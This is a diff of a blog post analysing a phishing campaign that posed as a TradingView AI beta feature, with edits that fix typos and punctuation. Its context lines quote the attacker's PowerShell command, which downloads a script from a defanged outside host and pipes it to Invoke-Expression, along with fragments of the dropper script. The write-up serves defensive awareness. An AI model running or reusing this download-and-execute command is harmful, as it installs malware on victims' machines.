@@ -48,7 +48,7 @@ The hosted command is deceptively simple:
 powershell -command "$tradingview='[.]app';$version='3.9.1_AI_Beta';$update='betamode'+$tradingview;$app=(Invoke-WebRequest $update -UseBasicParsing).Content;([Text.Encoding]::UTF8.GetString($app))|Invoke-Expression"
 ```
 
-With a little bit of revese engneering we can see it:
+With a little bit of reverse engineering we can see it:
 - Pulls content from `https://betamode[.]app`
 - Pipes it straight into `Invoke-Expression` — meaning **code execution**
 
@@ -61,13 +61,13 @@ if (Test-Path "$env:APPDATA\Nt\client32.ini") {
     exit
 }
 ```
-> A basic infection marker. If the system is already compromised, it exits and prints flavour text — presumably to avoid duplicate infections or raise suspicion with multiple popups.
+> A basic infection marker. If the system is already compromised, it exits and prints flavour text, presumably to avoid duplicate infections or raise suspicion with multiple popups.
 ### 2. Creates a Folder `C:\Users\{User}\AppData\Roaming\Nt`:
 ```powershell
 $ntFolderPath = Join-Path $env:APPDATA "Nt"
 New-Item -Path $ntFolderPath -ItemType Directory -Force
 ```
-Standard folder creation nothing sophisticated here. Typically pretty well hidden from the user making it a common place for malware will drop its binaries.
+Standard folder creation, nothing sophisticated here. Typically pretty well hidden from the user, making it a common place for malware will drop its binaries.
 
 ### 3. Downloads Multiple Executables:
 
@@ -117,7 +117,7 @@ Classic misdirection. This message closes the loop on the fake “AI beta featur
 
 ---
 
-## Why This *Simple* Campaign Almost Worked
+## Why This  *Simple*  Campaign Almost Worked
 
 Despite the fact that the actual malware was unsophisticated, the **delivery mechanism** was **exceptionally well-executed**. What made this campaign effective wasn't technical complexity it was **visual polish**, **clever use of branding**, and a level of attention to detail that most scams skip.
 
@@ -139,7 +139,7 @@ Here’s a comparison between the legitimate TradingView YouTube page and the ph
 ![Phish Channel](/pictures/crypto-phish/fake_youtube.png)
 
 **Hard to tell, right?**  
-Even with a trained eye, it’s easy to see how someone could be tricked. Especially when you realise that **all the videos on both pages are legitimate!!!!**.
+Even with a trained eye, it’s easy to see how someone could be tricked. Especially when you realise that **all the videos on both pages are legitimate!!!!**
 
 The phishing channel cleverly **embedded or mirrored real TradingView videos** to appear authentic. From what I can tell, the **only video actually uploaded by the attacker** is the one pushing the fake AI indicator. The rest just redirect or frame content from the real channel making it appear like part of the official video library.
 ### **The Domains Looked Legitimate and Thought-Out**
@@ -153,7 +153,7 @@ These weren’t sketchy domains ending in `.xyz`, `.top`, or `.cn`. They were:
 
 ![Copy Code](/pictures/crypto-phish/copycode.jpeg)
 
-`copycode[.]io` clearly had **serious work put into it** likely involving image generation to create branded assets and filler content. The site **didn’t raise red flags** until I tried to click on the links at the bottom of the page. It wasn't trying to sell anything, just present itself as a clean code repository.
+`copycode[.]io` clearly had **serious work put into it** likely involving image generation to create branded assets and filler content. The site **didn’t raise red flags** until I tried to click on the links at the bottom of the page, and they didn't go anywhere. It wasn't trying to sell anything, just present itself as a clean code repository.
 
 ### **The Instructions Were Technical, But Approachable**
 Another standout point: the process they described was **exactly the kind of arcane but plausible series of steps you'd expect** when enabling a hidden beta feature.
